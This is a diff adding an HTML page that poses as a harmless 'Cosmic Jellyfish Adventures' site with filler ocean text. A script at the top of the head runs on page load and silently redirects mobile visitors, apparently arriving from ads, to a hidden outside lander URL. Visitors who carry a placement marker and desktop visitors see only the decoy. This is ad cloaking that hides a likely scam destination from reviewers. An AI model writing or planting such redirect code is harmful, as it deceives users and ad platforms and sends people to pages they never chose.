@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/dade2563-43ce-4351-9ba3-22961c539221?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cosmic Jellyfish Adventures</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background: linear-gradient(45deg, #FF6B6B, #4ECDC4);
+            margin: 0;
+            padding: 0;
+            color: #333;
+        }
+        .container {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            padding: 20px;
+        }
+        header {
+            grid-column: 1 / -1;
+            background-color: #45ADA8;
+            padding: 20px;
+            text-align: center;
+        }
+        main {
+            grid-column: 1 / 3;
+            background-color: rgba(255, 255, 255, 0.8);
+            padding: 20px;
+            border-radius: 15px;
+        }
+        aside {
+            background-color: #594F4F;
+            color: #fff;
+            padding: 20px;
+            border-radius: 15px;
+        }
+        footer {
+            grid-column: 1 / -1;
+            background-color: #FF6B6B;
+            padding: 10px;
+            text-align: center;
+        }
+        h1 {
+            font-size: 2.5em;
+            color: #FFF;
+        }
+        a {
+            color: #FF6B6B;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>Cosmic Jellyfish Adventures</h1>
+        </header>
+        <main>
+            <h2>Welcome to the Underwater Cosmos</h2>
+            <p>Embark on a journey through the bioluminescent wonders of the deep sea. Our cosmic jellyfish await your exploration!</p>
+            <p>Discover the secrets of the ocean's most enigmatic creatures as they light up the darkness with their otherworldly glow.</p>
+        </main>
+        <aside>
+            <h3>Did You Know?</h3>
+            <ul>
+                <li>Some jellyfish are immortal!</li>
+                <li>There are jellyfish larger than blue whales.</li>
+                <li>Jellyfish have existed for over 500 million years.</li>
+            </ul>
+        </aside>
+        <footer>
+            <p>&copy; 2023 Cosmic Jellyfish Adventures | <a href="https://tokreward.com/privacy.html">Privacy Policy</a></p>
+        </footer>
+    </div>
+</body>
+</html>
